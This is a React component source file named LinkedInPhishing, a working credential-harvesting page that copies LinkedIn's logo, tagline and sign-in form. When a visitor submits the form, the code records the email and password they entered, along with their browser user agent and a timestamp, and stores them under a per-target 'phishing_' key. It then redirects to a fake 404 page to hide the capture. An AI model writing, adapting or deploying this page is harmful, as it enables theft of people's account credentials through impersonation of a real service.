
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const LinkedInPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'LinkedIn',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-8">
          <svg className="w-12 h-12 mx-auto mb-4" viewBox="0 0 24 24" fill="#0077b5">
            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
          </svg>
          <h1 className="text-3xl font-light text-gray-900 mb-2">LinkedIn</h1>
          <p className="text-gray-600">Stay updated on your professional world</p>
        </div>

        {/* Login Form */}
        <div className="bg-white rounded-lg shadow-md p-6">
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Email or Phone
              </label>
              <Input
                type="text"
                placeholder=""
                value={formData.email}
                onChange={(e) => setFormData({...formData, email: e.target.value})}
                className="w-full h-12 px-3 border border-gray-300 rounded text-gray-900 bg-white focus:border-blue-600"
                required
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Password
              </label>
              <Input
                type="password"
                placeholder=""
                value={formData.password}
                onChange={(e) => setFormData({...formData, password: e.target.value})}
                className="w-full h-12 px-3 border border-gray-300 rounded text-gray-900 bg-white focus:border-blue-600"
                required
              />
            </div>

            <div className="text-center">
              <a href="#" className="text-blue-600 text-sm font-semibold">Forgot password?</a>
            </div>

            <Button 
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white h-12 text-lg font-semibold rounded-full"
            >
              Sign in
            </Button>
          </form>

          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-sm">or</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <Button className="w-full bg-transparent border border-gray-600 text-gray-700 h-12 font-semibold rounded-full hover:bg-gray-50">
            Continue with Google
          </Button>

          <div className="text-center mt-6">
            <p className="text-sm text-gray-600">
              New to LinkedIn? 
              <a href="#" className="text-blue-600 font-semibold ml-1">Join now</a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LinkedInPhishing;
